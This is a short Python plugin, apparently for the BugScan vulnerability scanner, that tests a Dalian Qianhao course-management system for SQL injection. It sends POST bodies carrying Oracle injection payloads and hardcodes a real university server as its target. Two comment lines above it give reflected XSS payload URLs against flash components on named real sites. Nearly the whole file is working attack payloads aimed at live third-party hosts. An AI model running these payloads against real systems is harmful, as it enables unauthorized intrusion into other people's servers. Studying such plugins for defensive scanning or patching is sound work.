#http://host.emlog.net/include/lib/js/uploadify/uploadify.swf?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28/bugscan/%29}}//
#http://www.phpcms.cn/statics/js/ckeditor/plugins/flashplayer/player/player.swf?skin=skin.swf%26stream%3D%5C%2522%29%29%7Dcatch%28e%29%7Balert%281%29%7D%2f%2f
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = qianhao sqli
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-065322

import re

def assign(service, arg):
	if service == 'dalianqianhao':
		return True, arg

def audit(arg):
    payload = 'ACTIONQUERYELECTIVERESULTBYTEACHSECRETARY.APPPROCESS?mode=2'
    target = arg + payload
    posts = ["bt_DYXZ=%b4%f2%d3%a1%d1%a1%d6%d0&bt_FXXD=%b7%b4%cf%f2%d1%a1%b6%a8&bt_QBCX=%c8%ab%b2%bf%b3%b7%cf%fa&bt_QBXZ=%c8%ab%b2%bf%d1%a1%d6%d0&CourseModeID=1)%20and%201=utl_inaddr.get_host_address('hen'||'tai')%20and%20(1=1&ReportTitle=%b9%fe%b6%fb%b1%f5%c9%cc%d2%b5%b4%f3%d1%a72014-2015%d1%a7%c4%ea%b5%da%b6%fe%d1%a7%c6%da%c9%cf%bf%ce%d1%a7%c9%fa%c3%fb%b5%a5&ScheduleSwitch=0&TeacherNO=130112&YearTermNO=16",
             "bt_DYXZ=%b4%f2%d3%a1%d1%a1%d6%d0&bt_FXXD=%b7%b4%cf%f2%d1%a1%b6%a8&bt_QBCX=%c8%ab%b2%bf%b3%b7%cf%fa&bt_QBXZ=%c8%ab%b2%bf%d1%a1%d6%d0&CourseModeID=1&ReportTitle=%b9%fe%b6%fb%b1%f5%c9%cc%d2%b5%b4%f3%d1%a72014-2015%d1%a7%c4%ea%b5%da%b6%fe%d1%a7%c6%da%c9%cf%bf%ce%d1%a7%c9%fa%c3%fb%b5%a5&ScheduleSwitch=0&TeacherNO=1&YearTermNO=1%20and%201=utl_inaddr.get_host_address('hen'||'tai')"]
    for post in posts:
        code, head, body, errcode, final_url = curl.curl2(target, post=post);
        if code == 200 and 'hentai' in body:
            security_warning(target+' has post inject')

if __name__ == '__main__':
	from dummy import *
	audit(assign('dalianqianhao', 'http://cityjw.dlut.edu.cn:7001/')[1])                